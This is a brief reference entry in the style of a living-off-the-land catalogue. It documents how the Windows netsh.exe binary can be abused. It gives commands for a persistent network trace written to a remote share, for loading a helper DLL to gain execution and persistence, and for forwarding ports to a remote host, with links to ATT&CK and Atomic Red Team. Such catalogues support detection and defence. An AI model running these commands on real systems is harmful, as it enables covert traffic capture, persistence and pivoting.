## Netsh.exe
* Functions: Execute, Surveillance
```

netsh.exe trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl IPv4.Address=!(<IPofRemoteFileShare>)
netsh.exe trace show status

Capture network traffic on remote file share.

netsh.exe add helper C:\Path\file.dll
Load (execute) NetSh.exe helper DLL file.

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
Forward traffic from the listening address and proxy to a remote system.
```
   
* Resources:   
  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Persistence/Netsh_Helper_DLL.md
  * https://attack.mitre.org/wiki/Technique/T1128
  * https://twitter.com/teemuluotio/status/990532938952527873
   
* Full path:   
  * C:\Windows\System32
  * C:\Windows\SysWOW64
   
* Notes:   
   
